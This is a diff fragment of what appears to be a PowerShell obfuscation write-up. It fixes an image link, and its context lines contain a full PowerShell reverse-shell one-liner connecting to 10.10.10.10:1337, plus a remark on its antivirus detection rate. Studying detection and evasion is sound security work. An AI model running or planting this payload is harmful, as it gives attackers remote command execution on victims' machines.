@@ -13,7 +13,7 @@ Powershell Reverse Shell:
 #powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 
-![Settings Window](https:/raw.github.com/jwfawcett/Powershell_Obfuscation_WriteUP/blob/main/exprevshellvt.png)
+![Settings Window](https://github.com/jwfawcett/Powershell_Obfuscation_WriteUP/blob/main/exprevshellvt.png)
 
 It was 24 out of 62 Antirus Solutions that caught it. Seems low but once again other solutions are used such as AMSI to and AI to catch this. 
 
